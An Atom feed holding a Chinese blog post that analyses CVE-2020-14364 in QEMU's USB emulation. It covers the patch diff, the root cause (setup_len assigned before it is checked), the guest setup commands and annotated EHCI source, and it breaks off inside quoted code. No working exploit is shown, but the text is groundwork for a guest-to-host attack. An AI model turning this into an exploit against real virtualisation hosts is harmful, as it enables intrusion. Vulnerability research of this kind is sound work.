<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ordin</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://leave-devour.github.io/"/>
  <updated>2021-02-22T14:45:37.577Z</updated>
  <id>https://leave-devour.github.io/</id>
  
  <author>
    <name>Ordin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-14364—分析</title>
    <link href="https://leave-devour.github.io/2021/02/22/CVE-2020-14364%E2%80%94%E5%88%86%E6%9E%90/"/>
    <id>https://leave-devour.github.io/2021/02/22/CVE-2020-14364%E2%80%94%E5%88%86%E6%9E%90/</id>
    <published>2021-02-22T14:42:06.000Z</published>
    <updated>2021-02-22T14:45:37.577Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h1 id="CVE-2020-14364漏洞复现"><a href="#CVE-2020-14364漏洞复现" class="headerlink" title="CVE-2020-14364漏洞复现"></a>CVE-2020-14364漏洞复现</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先先去cve官网看下这个漏洞的说明</p><p>An out-of-bounds read/write access flaw was found in the USB emulator of the QEMU in versions before 5.2.0.<br>This issue occurs while processing USB packets from a guest when USBDevice ‘setup_len’ exceeds its ‘data_buf[4096]’ in the do_token_in, do_token_out routines.<br>This flaw allows a guest user to crash the QEMU process,<br>resulting in a denial of service, or the potential execution of arbitrary code with the privileges of the QEMU process on the host.</p><p>先diff一下</p><p>git diff tags/v5.1.0  tags/v5.2.0 hw/usb/core.c</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hw/usb/core.c b/hw/usb/core.c</span><br><span class="line">index 5abd128..5234dcc 100644</span><br><span class="line"><span class="comment">--- a/hw/usb/core.c</span></span><br><span class="line"><span class="comment">+++ b/hw/usb/core.c</span></span><br><span class="line">@@ -129,6 +129,7 @@ void usb_wakeup(USBEndpoint *ep, unsigned int stream)</span><br><span class="line"> static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;iov.size != 8) &#123;</span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">@@ -138,14 +139,15 @@ static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line">     usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line">     p-&gt;actual_length = 0;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 "usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n",</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">@@ -259,26 +261,28 @@ static void do_token_out(USBDevice *s, USBPacket *p)</span><br><span class="line"> static void do_parameter(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int i, request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     for (i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">         s-&gt;setup_buf[i] = p-&gt;parameter &gt;&gt; (i*8);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     s-&gt;setup_state = SETUP_STATE_PARAM;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">     index   = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4];</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 "usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n",</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;pid == USB_TOKEN_OUT) &#123;</span><br><span class="line">         usb_packet_copy(p, s-&gt;data_buf, s-&gt;setup_len);</span><br></pre></td></tr></table></figure><p>对比增加和删除的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞产生的原因就是：</span><br><span class="line">s-&gt;setup_len这个变量</span><br><span class="line">这个变量是先赋值然后校验</span><br><span class="line">s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)</span><br><span class="line">校验不成功并没有把 原来的值修改回来，这样就能产生越界</span><br></pre></td></tr></table></figure><h2 id="环境布置"><a href="#环境布置" class="headerlink" title="环境布置"></a>环境布置</h2><p>这次环境布置多亏了 zhz师傅和resery师傅，呜呜 qemu的环境不能之前像 kernel那种，最后还是在直接装了一个iso镜像进入qcow2镜像中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先创建一个镜像</span><br><span class="line">qemu-img create -f qcow2 XXXX.img 20G</span><br><span class="line">qemu-system-x86_64 -m 1G -hda XXXX.img -cdrom XXXX.iso -enable-kvm</span><br><span class="line">然后就是vnc练上去装一个就可以了</span><br><span class="line">装的话，可以百度下 ubuntu server版本的安装，就跟那差不多</span><br><span class="line">装完大多数都得用vnc连接上去开机</span><br><span class="line">但是如果sdl的库装好了，也不用vnc连接，因为qemu是支持sdl的</span><br><span class="line">但是sdl 着实难用，最后还是用了vnc</span><br></pre></td></tr></table></figure><p>launch.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">sudo /home/yezi/Desktop/qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 \</span><br><span class="line">-hda xxx.qcow2 \</span><br><span class="line">-<span class="built_in">enable</span>-kvm -m 2G \</span><br><span class="line">-usb \</span><br><span class="line">-drive <span class="keyword">if</span>=none,format=raw,id=disk1,file=/home/yezi/Desktop/CVE-2020-14364/disk_01.img \</span><br><span class="line">-device ich9-usb-ehci1,id=usb \</span><br><span class="line">-device usb-storage,drive=disk1 \</span><br><span class="line">-net user,hostfwd=tcp::2222-:22 -net nic \</span><br></pre></td></tr></table></figure><p>其实像这个 设备的模拟，命令也蛮重要的，刚刚开始的时候，不知道怎么才能开启这个usb这个设备，也不清楚如何使用ehci这个协议 这时候就得去看看别人是如何仿真的，或者去官网的文档去看下</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>struct USBDevice {    DeviceState qdev;    USBPort *port;    char *port_path;    char *serial;    void *opaque;    uint32_t flags;/* Actual connected speed */int speed;/* Supported speeds, not in info because it may be variable (hostdevs) */int speedmask;uint8_t addr;char product_desc[32];int auto_attach;bool attached;int32_t state;uint8_t setup_buf[8];//uint8_t data_buf[4096];int32_t remote_wakeup;int32_t setup_state;int32_t setup_len;int32_t setup_index;USBEndpoint ep_ctl;USBEndpoint ep_in[USB_MAX_ENDPOINTS];USBEndpoint ep_out[USB_MAX_ENDPOINTS];QLIST_HEAD(, USBDescString) strings;const USBDesc *usb_desc; /* Overrides class usb_desc if not NULL */const USBDescDevice *device;int configuration;int ninterfaces;int altsetting[USB_MAX_INTERFACES];const USBDescConfig *config;const USBDescIface  *ifaces[USB_MAX_INTERFACES];</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-usb \</span><br><span class="line">-drive if=none,format=raw,id=disk1,file=/home/yezi/Desktop/CVE-2020-14364/disk_01.img \</span><br><span class="line">-device ich9-usb-ehci1,id=usb,bus=pci.0 \</span><br><span class="line">-device usb-storage,bus=usb.0,drive=disk1 \</span><br></pre></td></tr></table></figure><p>我用这个配置起的qemu</p><p>但是lspci -nnv的时候，显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:04.0 USB controller [0c03]: Intel Corporation 82801I (ICH9 Family) USB2 EHCI Controller #1 [8086:293a] (r)</span><br><span class="line">Subsystem: Red Hat, Inc QEMU Virtual Machine [1af4:1100]</span><br><span class="line">Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=4K]</span><br><span class="line">Kernel driver in use: ehci-pci</span><br><span class="line"></span><br><span class="line">00:01.2 USB controller [0c03]: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] [8086:7020] (rev 01) ()</span><br><span class="line">Subsystem: Red Hat, Inc QEMU Virtual Machine [1af4:1100]</span><br><span class="line">Flags: bus master, fast devsel, latency 0, IRQ 11</span><br><span class="line">I/O ports at c140 [size=32]</span><br><span class="line">Kernel driver in use: uhci_hcd</span><br></pre></td></tr></table></figure><p>这样显示</p><p>我想，这个不是echi吗，为什么会显示 Kernel driver in use: uhci_hcd呢，这里说的是不是看 0:04.0，也就是usb缓存的位置<br>这个位置所以在的驱动决定了到时候的处理包的执行链，也就是使用什么接口 uhci xhci ehci 这几个</p><p>像这些操作 mmio pmio的</p><p>建议先看 ops<br>这次的有三组 ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps ehci_mmio_caps_ops = &#123;</span><br><span class="line">    .read = ehci_caps_read,</span><br><span class="line">    .write = ehci_caps_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">1</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .impl.min_access_size = <span class="number">1</span>,</span><br><span class="line">    .impl.max_access_size = <span class="number">1</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;</span><br><span class="line">    .read = ehci_opreg_read,</span><br><span class="line">    .write = ehci_opreg_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps ehci_mmio_port_ops = &#123;</span><br><span class="line">    .read = ehci_port_read,</span><br><span class="line">    .write = ehci_port_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">ehci_caps_read</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;caps[addr];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个write没有是因为我们不能修改 caps寄存器的值，只能读</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">ehci_opreg_read</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> FRINDEX:<span class="comment">//0xc</span></span><br><span class="line">        <span class="comment">/* Round down to mult of 8, else it can go backwards on migration */</span></span><br><span class="line">        val = s-&gt;frindex &amp; ~<span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        val = s-&gt;opreg[addr &gt;&gt; <span class="number">2</span>];<span class="comment">//这里opreg的size 0x44/sizeof(uint32_t)，这里没判断addr会不会越界了</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    trace_usb_ehci_opreg_read(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">ehci_port_read</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> val;</span><br><span class="line"></span><br><span class="line">    val = s-&gt;portsc[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    trace_usb_ehci_portsc_read(addr + s-&gt;portscbase, addr &gt;&gt; <span class="number">2</span>, val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_port_write</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">int</span> port = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> *portsc = &amp;s-&gt;portsc[port];</span><br><span class="line">    <span class="keyword">uint32_t</span> old = *portsc;</span><br><span class="line">    USBDevice *dev = s-&gt;ports[port].dev;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_portsc_write(addr + s-&gt;portscbase, addr &gt;&gt; <span class="number">2</span>, val);</span><br><span class="line">    <span class="comment">// 这个看起来要设置很多位，有不少标志位</span></span><br><span class="line">    <span class="comment">/* Clear rwc bits */</span></span><br><span class="line">    *portsc &amp;= ~(val &amp; PORTSC_RWC_MASK);</span><br><span class="line">    <span class="comment">/* The guest may clear, but not set the PED bit */</span></span><br><span class="line">    *portsc &amp;= val | ~PORTSC_PED;</span><br><span class="line">    <span class="comment">/* POWNER is masked out by RO_MASK as it is RO when we've no companion */</span></span><br><span class="line">    handle_port_owner_write(s, port, val);</span><br><span class="line">    <span class="comment">/* And finally apply RO_MASK */</span></span><br><span class="line">    val &amp;= PORTSC_RO_MASK;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((val &amp; PORTSC_PRESET) &amp;&amp; !(*portsc &amp; PORTSC_PRESET)) &#123;</span><br><span class="line">        trace_usb_ehci_port_reset(port, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(val &amp; PORTSC_PRESET) &amp;&amp;(*portsc &amp; PORTSC_PRESET)) &#123;</span><br><span class="line">        trace_usb_ehci_port_reset(port, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (dev &amp;&amp; dev-&gt;attached) &#123;</span><br><span class="line">            usb_port_reset(&amp;s-&gt;ports[port]);</span><br><span class="line">            *portsc &amp;= ~PORTSC_CSC;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *  Table 2.16 Set the enable bit(and enable bit change) to indicate</span></span><br><span class="line"><span class="comment">         *  to SW that this port has a high speed device attached</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (dev &amp;&amp; dev-&gt;attached &amp;&amp; (dev-&gt;speedmask &amp; USB_SPEED_MASK_HIGH)) &#123;</span><br><span class="line">            val |= PORTSC_PED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((val &amp; PORTSC_SUSPEND) &amp;&amp; !(*portsc &amp; PORTSC_SUSPEND)) &#123;</span><br><span class="line">        trace_usb_ehci_port_suspend(port);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(val &amp; PORTSC_FPRES) &amp;&amp; (*portsc &amp; PORTSC_FPRES)) &#123;</span><br><span class="line">        trace_usb_ehci_port_resume(port);</span><br><span class="line">        val &amp;= ~PORTSC_SUSPEND;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    *portsc &amp;= ~PORTSC_RO_MASK;</span><br><span class="line">    *portsc |= val;</span><br><span class="line">    trace_usb_ehci_portsc_change(addr + s-&gt;portscbase, addr &gt;&gt; <span class="number">2</span>, *portsc, old);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">ehci_opreg_read</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        <span class="comment">/* Round down to mult of 8, else it can go backwards on migration */</span></span><br><span class="line">        val = s-&gt;frindex &amp; ~<span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        val = s-&gt;opreg[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    trace_usb_ehci_opreg_read(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_opreg_write</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> old = *mmio;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;<span class="comment">//根据地址来判断case ，单最后基本都会执行*mmio=val</span></span><br><span class="line">    <span class="keyword">case</span> USBCMD:</span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_HCRESET) &#123;</span><br><span class="line">            ehci_reset(s); <span class="comment">// 重启？</span></span><br><span class="line">            val = s-&gt;usbcmd;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/* not supporting dynamic frame list size at the moment */</span></span><br><span class="line">        <span class="keyword">if</span> ((val &amp; USBCMD_FLS) &amp;&amp; !(s-&gt;usbcmd &amp; USBCMD_FLS)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"attempt to set frame list size -- value %d\n"</span>,</span><br><span class="line">                    (<span class="keyword">int</span>)val &amp; USBCMD_FLS);</span><br><span class="line">            val &amp;= ~USBCMD_FLS;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_IAAD) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Process IAAD immediately, otherwise the Linux IAAD watchdog may</span></span><br><span class="line"><span class="comment">             * trigger and re-use a qh without us seeing the 